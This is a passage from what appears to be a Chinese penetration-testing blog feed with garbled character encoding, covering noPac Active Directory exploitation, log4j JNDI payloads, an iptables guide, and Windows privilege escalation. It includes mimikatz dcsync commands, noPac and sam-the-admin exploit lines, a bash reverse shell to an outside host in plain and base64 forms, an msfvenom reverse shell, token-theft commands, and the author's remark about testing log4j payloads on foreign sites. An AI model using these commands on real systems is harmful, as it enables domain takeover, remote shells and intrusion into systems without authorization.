class="line">0iJPCoFLaTCSvlMmq3G5&#x2F;4epI0gjwx6a6oeUTutxc8MfnHL2kAYxW7tgezuDxKVno4LZFVJWKbObrXctu2i16Dr7m5eLgyuKf5UQ41RiOUoTSLQUt4s2gq73&#x2F;NG1MzwRmPq5Z+cWmXDzVual58Mm5W4fipIYqPg88Wnm+&#x2F;WmxYi0ICQgxhJENaZQf3UM0fXKSjTzgVWHkFRfaGx4uaAqzn8MKs4FtCmSf+OVEf7QW0imtvDAsQNixLU8ZTF+OK6rZDs76GB43KUxlhPUTl7NE9kpzlwcef8HiRc4rSsc386&#x2F;NeqsSDjZXgqYcAAQX7v0tNJ0lt+sRrg6GQT7YYHegOMQ9ywBgvdMVAFAzEPMnmW7GhHCOhubxHtDzAEDgkmpM0LXdE27m0acD6XyrRTPdf8slsKD1GliX5iW77L9+qqThwBmb9xRMFgNRFGJDE62g0SlY3+QY1IRpdAUqCuBHKctmeyWemDVBlJWbmqooHwBU3HwOxe8J+TPUevVBko4HDMIHAoAMCAQCigbgEgbV9gbIwga+ggawwgakwgaagGzAZoAMCARehEgQQHKpy33rwHG1c49Aha5Vzp6EJGwdMQUIuQ09NohEwD6ADAgEBoQgwBhsEREMwMaMHAwUAQOEAAKURGA8yMDIxMTIyMTA3MTEwN1qmERgPMjAyMTEyMjExNzExMDdapxEYDzIwMjExMjI4MDcxMTA3WqgJGwdMQUIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdsYWIuY29t</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><del>è¿™é‡Œä¸ç®¡ä½¿ç”¨cmd è¿˜æ˜¯powershell  å‘½ä»¤å¤ªé•¿äº†è¢«åˆ†æˆäº†ä¸¤ä¸ªâ€¦â€¦ï¼Ÿï¼Ÿï¼Ÿ</del></p>
<p>é¢ å±…ç„¶æ˜¯åœ¨å¤åˆ¶æ—¶å€™ å¤ªé•¿notepadç»™è‡ªå·±æ¢è¡Œäº†</p>
<p><img src="/posts/1fd95242/12.png" alt="æˆªå›¾"></p>
<br>

<h4 id="è·å–krbtgtç”¨æˆ·çš„NTLM-Hash"><a href="#è·å–krbtgtç”¨æˆ·çš„NTLM-Hash" class="headerlink" title="è·å–krbtgtç”¨æˆ·çš„NTLM Hash"></a>è·å–krbtgtç”¨æˆ·çš„NTLM Hash</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;user:lab\krbtgt</span><br></pre></td></tr></table></figure>

<p><img src="/posts/1fd95242/13.png" alt="æˆªå›¾"></p>
<br>

<h4 id="æ¸…é™¤ç¥¨æ®"><a href="#æ¸…é™¤ç¥¨æ®" class="headerlink" title="æ¸…é™¤ç¥¨æ®"></a>æ¸…é™¤ç¥¨æ®</h4><p><code>klist purge</code></p>
<br>

<h3 id="noPac"><a href="#noPac" class="headerlink" title="noPac"></a>noPac</h3><p><a href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></p>
<p><a href="https://github.com/waterrr/noPac?ref=pythonawesome.com">https://github.com/waterrr/noPac?ref=pythonawesome.com</a></p>
<p>åœ¨win2008ä¸‹ æç¤ºéœ€è¦ .Net4.0 ç»“æœå®‰è£…å¤±è´¥äº†..</p>
<p>ç„¶åæ¢win2012R2 çš„ä¸€å°åŸŸæœºå™¨å»å¤ç°</p>
<p>0x01 æ‰«ææ¢æµ‹</p>
<p><code>noPac.exe -scan  -domain lab.com -user user01 -pass Test.123</code>  ï¼ˆè¿™é‡Œå¯†ç åŠ â€™â€™ä¼šæŠ¥é”™ï¼‰</p>
<p><img src="/posts/1fd95242/14.png" alt="æˆªå›¾"></p>
<p>å¤ç°å¤±è´¥ï¼Œå¯ç”¨åˆ›å»ºç”¨æˆ·ï¼Œä½†æ˜¯å†</p>
<p>ç„¶åå°è¯•å†è¿™ä¸ªæ™®é€šåŸŸç”¨æˆ·ä¸‹å»å®‰è£…python ä½†æ˜¯æŠ¥é”™ç­–ç•¥XX å¤±è´¥  pythonå®‰è£…ä¹Ÿè¶…æ—¶äº† **@#ï¿¥@**@$@#</p>
<p> å»å°è¯•å®‰è£…ã€‚net4.5  è¿˜æ˜¯è¶…æ—¶äº† è¿™ä¸ªåŸŸç¯å¢ƒæ˜¯åˆ«äººç»™æˆ‘çš„  çœŸ***çƒ‚ï¼ŒPTT,PTK,PTHéƒ½å®éªŒä¸äº† æœºå™¨ç½‘ä¹Ÿé—®é¢˜å¾ˆå¤§ èƒ½è®¿é—®bing åˆ«çš„è®¿é—®ä¸äº†â€¦.</p>
<h4 id="è¸©å®Œçš„åçš„åˆ©ç”¨ã€‚ã€‚ã€‚"><a href="#è¸©å®Œçš„åçš„åˆ©ç”¨ã€‚ã€‚ã€‚" class="headerlink" title="è¸©å®Œçš„åçš„åˆ©ç”¨ã€‚ã€‚ã€‚"></a>è¸©å®Œçš„åçš„åˆ©ç”¨ã€‚ã€‚ã€‚</h4><h5 id="æ‰«ææ¢æµ‹"><a href="#æ‰«ææ¢æµ‹" class="headerlink" title="æ‰«ææ¢æµ‹"></a>æ‰«ææ¢æµ‹</h5><p><code>noPac.exe scan -domain lab.com -user user01 -pass Test.123</code>  è¿™é‡Œå¯†ç å¤„ç½‘ä¸ŠåŠ çš„â€™â€™ä½†æ˜¯è¿™é‡Œæˆ‘åŠ ä¸Šå°±ä¼šæŠ¥é”™ ä¸åŠ çš„è¯å¯æ­£å¸¸ä½¿ç”¨</p>
<p><img src="/posts/1fd95242/15.png" alt="æˆªå›¾"></p>
<h5 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h5><p><code>./noPac.exe -domain attack.local -user oa -pass &#39;!@#Qz123&#39; /dc dc.attack.local /mAccount test123 /mPassword passW0rd /service cifs /ptt</code></p>
<p><code>ls  \\DC01.lab.com\C$ </code></p>
<p><img src="/posts/1fd95242/16.png" alt="æˆªå›¾"></p>
<br>

<p>è¿˜æœ‰ä¸ªpythonç‰ˆçš„noPac ä½†æ˜¯è¿™å°æœºå™¨ä¸Šçš„pythonæ˜¯ç¦»çº¿å®‰è£…çš„ pipè¿˜ä¸çŸ¥é“æ€ä¹ˆå®‰ â”­â”®ï¹â”­â”® è¸©å‘è¸©äº†ä¸€å¤©ç»ˆäºèƒ½å¤ç°åˆ°äº†</p>
<br>

<h4 id="noPacï¼ˆpythonï¼‰"><a href="#noPacï¼ˆpythonï¼‰" class="headerlink" title="noPacï¼ˆpythonï¼‰"></a>noPacï¼ˆpythonï¼‰</h4><p> <a href="https://github.com/waterrr/noPac?ref=pythonawesome.com">https://github.com/waterrr/noPac?ref=pythonawesome.com</a></p>
<br>

<h4 id="Sam-the-admin"><a href="#Sam-the-admin" class="headerlink" title="Sam_the_admin"></a>Sam_the_admin</h4><p>CVE-2021-42287/CVE-2021-42278 Attack</p>
<p>Python åˆ©ç”¨è„šæœ¬ï¼š<a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
<p><code>python3 sam_the_admin.py &quot;redteam/saul:Red12345&quot; -dc-ip 10.10.10.8 -shell</code></p>
<p>è¿™ä¸ªè¿˜æ²¡å°è¯• <a href="https://heibai.org.cn/2071.html">https://heibai.org.cn/2071.html</a></p>
<br>

<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>è¿™ä¸ªæ´å¤ç°è¸©äº†å¥½å¤šå‘â€¦.ç”¨äº†ä¸€å¤©çš„æ—¶é—´â€¦.</p>
<p>ç”±äºæµ‹è¯•æœºå™¨ä½¿ç”¨çš„åŸŸå†…æ™®é€šç”¨æˆ·ï¼Œåœ¨ä¸‹è½½ã€å®‰è£…ä¸Šéƒ½ä¼šå—åˆ°é™åˆ¶ï¼Œç„¶åé€‰æ‹©é‡‡å–ä½¿ç”¨ç¦»çº¿å®‰è£…çš„æ–¹å¼å»ä¸‹è½½ç›¸å…³ç‰ˆæœ¬ï¼Œåªä¸‹è½½äº†å…å®‰è£…çš„.net 4.6å’Œ py3.7 ä½†æ˜¯py3çš„pipè¿˜æ²¡æ•´ä¸Šå»ï¼Œåç»­çš„expè„šæœ¬å°±æ²¡æœ‰æµ‹è¯•ã€‚</p>
<p>è¿˜æœ‰å°±æ˜¯å› ä¸ºæ˜¯åœ¨è™šæ‹Ÿæœºä¸Šè¿è¡Œçš„ï¼Œä¸”æ˜¯ä½¿ç”¨çš„åŸŸå†…æ™®é€šç”¨æˆ·ï¼Œå› æ­¤è¿™ä¸ªvmtools æ— æ³•ç›´æ¥ä»å¤–é¢å¤åˆ¶è¿›æ¥æ–‡ä»¶ï¼Œè€Œä¸”åœ¨å°è¯•ç›´æ¥ä½¿ç”¨python httpæœåŠ¡å»ä¸‹è½½æ˜¯ é»˜è®¤æµè§ˆå™¨å­˜åœ¨å®‰å…¨ç­–ç•¥ï¼Œè€Œæ™®é€šç”¨æˆ·æ— æ³•å…³é—­ï¼Œç„¶åæˆ‘å»ç”¨administratorå»å…³é—­äº†IEå®‰å…¨ç­–ç•¥åï¼Œè¿˜æ˜¯å­˜åœ¨å®‰å…¨ç­–ç•¥ï¼Œç„¶åæ²¡æ³•ä½¿ç”¨ã€‚åªèƒ½é€šè¿‡åœ¨æµ‹è¯•æœºå™¨ä¸Šå»è®¿é—®administratorç›®å½•ä¸‹ ä»å¤–é¢æ‹–è¿›æ¥çš„æ‰€éœ€è¦çš„æ–‡ä»¶</p>
]]></content>
      <categories>
        <category>ææƒ</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
        <tag>ææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>log4j_rceåˆ©ç”¨</title>
    <url>/posts/5bd4bc7e/</url>
    <content><![CDATA[<p>ç¨‹åºåœ¨ä½¿ç”¨æ—¥å¿—è¯»å–ç”¨æˆ·è¾“å…¥æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„ä»£ç ${}</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap:&#x2F;&#x2F;f03b65e6.dns.1433.eu.org.&#x2F;exp&#125;</span><br><span class="line"></span><br><span class="line">1.7</span><br><span class="line"></span><br><span class="line">$&#123;jndi:ldap:&#x2F;&#x2F;IP:1389&#x2F;shzltp&#125;</span><br><span class="line">ldap:&#x2F;&#x2F;IP:1389&#x2F;shzltp</span><br><span class="line"></span><br><span class="line">1.8</span><br><span class="line">$&#123;jndi:ldap:&#x2F;&#x2F;IP:1389&#x2F;ojzxns&#125;</span><br><span class="line">ldap:&#x2F;&#x2F;IP:1389&#x2F;ojzxns</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bashè½¬ç &quot; -A  IP</span><br><span class="line"></span><br><span class="line">ping &#96;whoami&#96;.48f3ebc4.dns.1433.eu.org.</span><br><span class="line">bash -c &#123;echo,cGluZyBgd2hvYW1pYC5mMDNiNjVlNi5kbnMuMTQzMy5ldS5vcmcu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,cGluZyBgd2hvYW1pYC5mMDNiNjVlNi5kbnMuMTQzMy5ldS5vcmcu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A  IP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;3344 0&gt;&amp;1</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS43Ni4yMjMuNTUvMzM0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS43Ni4yMjMuNTUvMzM0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;  -A  IP</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ„Ÿè§‰å¯¹äºä¸€äº›å°å‹ä¼ä¸šåŸºæœ¬ä¸ä¼šå»ä½¿ç”¨è¿™ä¸ªä¸œè¥¿ï¼Œå¯¹äºå¤§å‹ç«™ç‚¹å¯èƒ½ä¼šå»ä½¿ç”¨ï¼Œä½†æ˜¯å¾€å¾€ä»–ä»¬çš„é˜²æŠ¤ä¹ŸåŠæ—¶ï¼Œä»Šå¤©ä¸‹åˆè¯•äº†ä¸€äº›å›½å¤–ç«™ç‚¹ï¼ŒåŸºæœ¬ä¸Šéƒ½ä¸å‡ºç½‘æ²¡æ³•æˆåŠŸåˆ©ç”¨ã€‚ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>log4j</category>
      </categories>
      <tags>
        <tag>log4j</tag>
      </tags>
  </entry>
  <entry>
    <title>iptablesç®€å•ä½¿ç”¨</title>
    <url>/posts/1d385bbc/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#æŸ¥çœ‹ç°åœ¨iptablesè§„åˆ™</span><br><span class="line">iptables -L -n -v</span><br><span class="line"></span><br><span class="line">#é…ç½®ï¼Œç¦æ­¢è¿›ï¼Œå…è®¸å‡ºï¼Œå…è®¸å›ç¯ç½‘å¡</span><br><span class="line">iptables -P INPUT DROP</span><br><span class="line">iptables -A OUTPUT -j ACCEPT</span><br><span class="line">iptables -A INPUT -i lo -j ACCEPT</span><br><span class="line"></span><br><span class="line">#å…è®¸ping</span><br><span class="line">iptables -A INPUT -p icmp -j ACCEPT</span><br><span class="line"></span><br><span class="line">#å…è®¸ssh</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line"></span><br><span class="line">#å…è®¸ftp</span><br><span class="line">iptables -A INPUT -p tcp --dport 21 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 20 -j ACCEPT</span><br><span class="line"></span><br><span class="line">#å…è®¸DNS</span><br><span class="line">iptables -A INPUT -p tcp -m tcp --dport 53 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p udp -m udp --dport 53 -j ACCEPT</span><br><span class="line"></span><br><span class="line">#å…è®¸httpå’Œhttps</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 443 -j ACCEPT</span><br><span class="line"></span><br><span class="line">#å…è®¸å·²å»ºç«‹çš„æˆ–ç›¸å…³è¿çš„é€šè¡Œ</span><br><span class="line">iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line"></span><br><span class="line">#ç¦æ­¢å…¶ä»–æœªå…è®¸çš„è§„åˆ™è®¿é—®</span><br><span class="line">iptables -A INPUT -j REJECT #ï¼ˆæ³¨æ„ï¼šå¦‚æœ22ç«¯å£æœªåŠ å…¥å…è®¸è§„åˆ™ï¼ŒSSHé“¾æ¥ä¼šç›´æ¥æ–­å¼€ã€‚ï¼‰</span><br><span class="line">iptables -A FORWARD -j REJECT</span><br><span class="line"></span><br><span class="line">#å±è”½IP</span><br><span class="line">iptables -I INPUT -s 192.168.1.4 -j DROP       #å±è”½å•ä¸ªIPçš„å‘½ä»¤</span><br><span class="line">iptables -I INPUT -s 123.0.0.0&#x2F;8 -j DROP      #å°æ•´ä¸ªæ®µå³ä»123.0.0.1åˆ°123.255.255.254</span><br><span class="line">iptables -I INPUT -s 192.168.0.0&#x2F;16 -j DROP    #å°IPæ®µå³ä»192.168.0.1åˆ°192.168.255.254</span><br><span class="line">iptables -I INPUT -s 192.168.1.0&#x2F;24 -j DROP    #å°IPæ®µå³ä»192.168.1.1åˆ°192.168.1.254</span><br><span class="line"></span><br><span class="line">#åˆ é™¤å·²æ·»åŠ çš„iptablesè§„åˆ™  -D</span><br><span class="line">iptables -D INPUT -s 192.168.1.4 -j DROP</span><br><span class="line">iptables -D INPUT 3 #åˆ é™¤ç¬¬ä¸‰æ¡</span><br><span class="line"></span><br><span class="line">#æ¸…é™¤é˜²ç«å¢™è§„åˆ™</span><br><span class="line">iptables -F	</span><br></pre></td></tr></table></figure>



<p>å‚è€ƒ  <a href="https://www.cnblogs.com/hellxz/p/9688044.html">https://www.cnblogs.com/hellxz/p/9688044.html</a></p>
]]></content>
      <categories>
        <category>iptables</category>
      </categories>
      <tags>
        <tag>iptables</tag>
      </tags>
  </entry>
  <entry>
    <title>Windowsææƒç¯‡</title>
    <url>/posts/61d7ac81/</url>
    <content><![CDATA[<h3 id="Windowsä¸­çš„ç”¨æˆ·ä¸ç»„"><a href="#Windowsä¸­çš„ç”¨æˆ·ä¸ç»„" class="headerlink" title="Windowsä¸­çš„ç”¨æˆ·ä¸ç»„"></a>Windowsä¸­çš„ç”¨æˆ·ä¸ç»„</h3><p><img src="/posts/61d7ac81/1.png"></p>
<h3 id="Potatoå®¶æ—ææƒ"><a href="#Potatoå®¶æ—ææƒ" class="headerlink" title="Potatoå®¶æ—ææƒ"></a>Potatoå®¶æ—ææƒ</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>é€šè¿‡å„ç§â½…æ³•åœ¨æœ¬åœ°NTLMä¸­ç»§è·å–SYSTEMä»¤ç‰Œï¼Œå†é€šè¿‡æ¨¡æ‹Ÿä»¤ç‰Œæ‰§â¾å‘½ä»¤ã€‚</p>
<h4 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h4><ul>
<li>è·å–é«˜æƒé™ä»¤ç‰Œâ€”â€”token</li>
<li>SeImpersonatePrivilege æˆ– SeAssignPrimaryTokenPrivilege æƒé™</li>
</ul>
<blockquote>
<p>å½“â½¤æˆ·å…·æœ‰ SeImpersonatePrivilege ç‰¹æƒï¼Œå¯ä»¥è°ƒâ½¤ CreateProcessWithTokenW ä»¥æŸ ä¸ªTokençš„æƒé™å¯åŠ¨æ–°è¿›ç¨‹ã€‚ </p>
<p>å½“â½¤æˆ·å…·æœ‰ SeAssignPrimaryTokenPrivilege ç‰¹æƒï¼Œå¯ä»¥è°ƒâ½¤ CreateProcessAsUserW ä»¥æŒ‡å®šâ½¤æˆ·æƒé™å¯åŠ¨æ–°è¿›ç¨‹ã€‚</p>
</blockquote>
<p><em>Windowsçš„token</em></p>
<ul>
<li>Delegation token(æˆæƒä»¤ç‰Œ):â½¤äºäº¤äº’ä¼šè¯ç™»å½•(ä¾‹å¦‚æœ¬åœ°â½¤æˆ·ç›´æ¥ç™»å½•ã€è¿œç¨‹æ¡Œâ¾¯ç™»å½•) </li>
<li>Impersonation token(æ¨¡æ‹Ÿä»¤ç‰Œ):â½¤äºâ¾®äº¤äº’ç™»å½•(åˆ©â½¤net useè®¿é—®å…±äº«â½‚ä»¶å¤¹</li>
</ul>
<p><em>WindowsæœåŠ¡ä½¿ç”¨çš„ç™»å½•è´¦æˆ·</em></p>
<ul>
<li>NT AUTHORITY\System </li>
<li>NT AUTHORITY\Network Service </li>
<li>NT AUTHORITY\Local Service</li>
</ul>
<h4 id="Juicypotato-MS16-075"><a href="#Juicypotato-MS16-075" class="headerlink" title="Juicypotato(MS16-075)"></a>Juicypotato(MS16-075)</h4><h5 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h5><p>é€šè¿‡DCOM æ¥ä½¿æœåŠ¡å‘æ”»å‡»è€…ç›‘å¬çš„ç«¯â¼å‘èµ·è¿æ¥å¹¶è¿›â¾NTLMè®¤è¯ã€‚</p>
<h5 id="æ¡ä»¶-1"><a href="#æ¡ä»¶-1" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h5><ul>
<li>1.å¼€å¯SeImpersonateæˆ–è€…SeAssignPrimaryTokenæƒé™</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami &#x2F;all</span><br><span class="line">whoami &#x2F;priv</span><br></pre></td></tr></table></figure>

<p><img src="/posts/61d7ac81/2.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å¦‚æœå¼€å¯SeImpersonateæƒé™ï¼Œjuicypotatoçš„å‚æ•°å¯ä»¥ä½¿ç”¨-t t</span><br><span class="line">å¦‚æœå¼€å¯SeAssignPrimaryTokenæƒé™ï¼Œjuicypotatoçš„å‚æ•°å¯ä»¥ä½¿ç”¨-t u</span><br><span class="line">å¦‚æœå‡å¼€å¯ï¼Œå¯ä»¥é€‰æ‹©-t *</span><br><span class="line">å¦‚æœå‡æœªå¼€å¯ï¼Œé‚£ä¹ˆæ— æ³•ææƒ</span><br></pre></td></tr></table></figure>

<ul>
<li>2.æŸ¥çœ‹RPCé»˜è®¤ç«¯å£æ˜¯å¦ä¸º135</li>
</ul>
<p><code>netsh advfirewall firewall add rule name=&quot;135&quot; protocol=TCP dir=in localport=135 action=allow</code></p>
<p><img src="/posts/61d7ac81/5.png"></p>
<ul>
<li>3.æ ¹æ®æ“ä½œç³»ç»Ÿé€‰æ‹©å¯ç”¨çš„CLSID</li>
</ul>
<p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p>
<p><img src="/posts/61d7ac81/3.png"></p>
<p><img src="/posts/61d7ac81/4.png"></p>
<ul>
<li>4.é€‰æ‹©ä¸€ä¸ªç³»ç»Ÿæœªå ç”¨çš„ç«¯å£ä½œä¸ºç›‘å¬ç«¯å£</li>
</ul>
<p> <code>-l</code> æŒ‡å®šç›‘å¬ç«¯å£</p>
<h5 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h5><ul>
<li>1.Juicy_potatoï¼ˆåŸç‰ˆï¼‰</li>
</ul>
<p><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\&gt;JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c &#123;03ca98d6-ff5d-49b8-abc6-03dd84127020&#125;</span><br><span class="line"></span><br><span class="line">Mandatory args:</span><br><span class="line">-t createprocessè°ƒç”¨: &lt;t&gt; CreateProcessWithTokenW, &lt;u&gt; CreateProcessAsUser, &lt;*&gt; try both</span><br><span class="line">-p &lt;program&gt;: è¿è¡ŒæŒ‡å®šç¨‹åº</span><br><span class="line">-l &lt;port&gt;: COMæœåŠ¡å™¨ä¾¦å¬ç«¯å£</span><br><span class="line"></span><br><span class="line">Optional args:</span><br><span class="line">-m &lt;ip&gt;: COMæœåŠ¡å™¨ä¾¦å¬åœ°å€ (é»˜è®¤ 127.0.0.1)</span><br><span class="line">-a &lt;argument&gt;: ä¼ é€’ç»™ç¨‹åºå‘½ä»¤è¡Œå‚æ•° (é»˜è®¤ NULL)</span><br><span class="line">-k &lt;ip&gt;: RPCæœåŠ¡å™¨IPåœ°å€ (é»˜è®¤ 127.0.0.1)</span><br><span class="line">-n &lt;port&gt;: RPCæœåŠ¡å™¨ä¾¦å¬ç«¯å£ (é»˜è®¤ 135)</span><br><span class="line">-c &lt;&#123;clsid&#125;&gt;: CLSID (default BITS:&#123;4991d34b-80a1-4291-83b6-3328366b9097&#125;)</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ohpe&#x2F;juicy-potato&#x2F;tree&#x2F;master&#x2F;CLSID</span><br><span class="line">-z ä»…æµ‹è¯•CLSIDå¹¶æ‰“å°ä»¤ç‰Œçš„ç”¨æˆ·</span><br></pre></td></tr></table></figure>

<p><img src="/posts/61d7ac81/6.png"></p>
<p>ç„¶åä¼šå¼¹å‡ºä¸€ä¸ªcmd <code>whoami</code> æŸ¥çœ‹ä¸ºsystemæƒé™</p>
<p><img src="/posts/61d7ac81/7.png"></p>
<ul>
<li>2.JuicyPotatoWeb(æ”¹)</li>
</ul>
<p><img src="/posts/61d7ac81/8.png"></p>
<p><code>JuicyPotatowweb.exe -p whoami</code></p>
<p>å¦‚æœCLSIDé»˜è®¤çš„ä¸è¡Œ å¯ä»¥æ¢åˆ«çš„è¯•è¯•</p>
<p><img src="/posts/61d7ac81/9.png"></p>
<h5 id="é˜²å¾¡æ–¹æ³•"><a href="#é˜²å¾¡æ–¹æ³•" class="headerlink" title="é˜²å¾¡æ–¹æ³•"></a>é˜²å¾¡æ–¹æ³•</h5><ul>
<li>1.é˜»æ­¢æ”»å‡»è€…è·å¾—SeImpersonateæˆ–è€…SeAssignPrimaryTokenæƒé™</li>
<li> 2.å³ä½¿æ‰“å¥½ç³»ç»Ÿè¡¥ä¸</li>
<li> 3.å‡çº§åˆ°æœ€æ–°çš„windowsç³»ç»Ÿ</li>
</ul>
<h4 id="BadPotato"><a href="#BadPotato" class="headerlink" title="BadPotato"></a>BadPotato</h4><p><a href="https://github.com/hifuck/badpotato">https://github.com/hifuck/badpotato</a></p>
<h5 id="ä½¿ç”¨-1"><a href="#ä½¿ç”¨-1" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h5><p><code>BadPotato.exe whoami</code></p>
<p><img src="/posts/61d7ac81/10.png"></p>
<h4 id="RoguePotato"><a href="#RoguePotato" class="headerlink" title="RoguePotato"></a>RoguePotato</h4><p>åç»­å†è¡¥å……~</p>
<h3 id="ä»¤ç‰Œçªƒå–"><a href="#ä»¤ç‰Œçªƒå–" class="headerlink" title="ä»¤ç‰Œçªƒå–"></a>ä»¤ç‰Œçªƒå–</h3><h4 id="incognito-exe"><a href="#incognito-exe" class="headerlink" title="incognito.exe"></a>incognito.exe</h4><p>ä¸‹è½½åœ°å€ <a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#åˆ—å–token</span><br><span class="line">incognito.exe list_tokens -u</span><br><span class="line">#è¿œç¨‹åˆ—ä¸¾token</span><br><span class="line">incognito.exe -h 192.168.0.159 -u pte1 -p &quot;Pte1.123&quot;  list_tokens -u</span><br><span class="line">#çªƒå–åˆ°systemæƒé™</span><br><span class="line">incognito.exe  execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe</span><br><span class="line">#é™æƒè‡³å½“å‰ç”¨æˆ·</span><br><span class="line">incognito.exe execute -c &quot;pte1-PC\pte1&quot; cmd.exe</span><br><span class="line">#è¿œç¨‹çªƒå–åˆ°systemæƒé™</span><br><span class="line">incognito.exe -h 192.168.0.159 -u pte1 -p &quot;Pte1.123&quot; execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="/posts/61d7ac81/11.png"></p>
<p><img src="/posts/61d7ac81/12.png"></p>
<p>ctrl+c é€€å‡ºå°±èƒ½æ¢å¤åŸæƒé™</p>
<h4 id="ä½¿ç”¨msf"><a href="#ä½¿ç”¨msf" class="headerlink" title="ä½¿ç”¨msf"></a>ä½¿ç”¨msf</h4><ul>
<li>1.ç”Ÿäº§shell</li>
</ul>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=198.168.0.133 LPORT=3344 -f exe -o  shell.exe</code>  (å¼¹shellä¹Ÿå¯ä»¥ä½¿ç”¨nishang çš„ ps1è„šæœ¬ä½†æ˜¯è¦æ±‚psç‰ˆæœ¬åœ¨3ä»¥ä¸Š)</p>
<p><img src="/posts/61d7ac81/13.png"></p>
<ul>
<li>2.ä½¿ç”¨msfå†…ç½®æ¨¡å— incognito</li>
</ul>
<p><img src="/posts/61d7ac81/14.png"></p>
<ul>
<li>3.çªƒå–token</li>
</ul>
<p><code>impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</code> #çªƒå–SYSTEMæƒé™</p>
<p><code>steal_token 1252</code> ä»è¿›ç¨‹ä¸­çªƒå–</p>
<p><img src="/posts/61d7ac81/15.png"></p>
<ul>
<li>4.æ¢å¤åˆ°ä¹‹å‰çš„æƒé™</li>
</ul>
<p><code>rev2self</code></p>
<p><img src="/posts/61d7ac81/16.png"></p>
<h3 id="å†…æ ¸ææƒ"><a href="#å†…æ ¸ææƒ" class="headerlink" title="å†…æ ¸ææƒ"></a>å†…æ ¸ææƒ</h3><h4 id="MS15-051"><a href="#MS15-051" class="headerlink" title="MS15-051"></a>MS15-051</h4><h4 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h4><h4 id="MS14-058"><a href="#MS14-058" class="headerlink" title="MS14-058"></a>MS14-058</h4><br>

<h3 id="æ•°æ®åº“ææƒ"><a href="#æ•°æ®åº“ææƒ" class="headerlink" title="æ•°æ®åº“ææƒ"></a>æ•°æ®åº“ææƒ</h3><h4 id="Mysql-UDFææƒ"><a href="#Mysql-UDFææƒ" class="headerlink" title="Mysql UDFææƒ"></a>Mysql UDFææƒ</h4><h5 id="æ¡ä»¶-2"><a href="#æ¡ä»¶-2" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h5><ul>
<li>å¿…é¡»æ˜¯rootæƒé™</li>
<li>secure_file_priv= </li>
<li>å°†udf.dll æ–‡ä»¶ä¸Šä¼ åˆ°Mysqlçš„pluginsç›®å½•ä¸‹</li>
</ul>
<p>å…·ä½“å¯ä»¥å‚è€ƒ<a href="https://blog.csdn.net/qq_36119192/article/details/84863268">https://blog.csdn.net/qq_36119192/article/details/84863268</a></p>
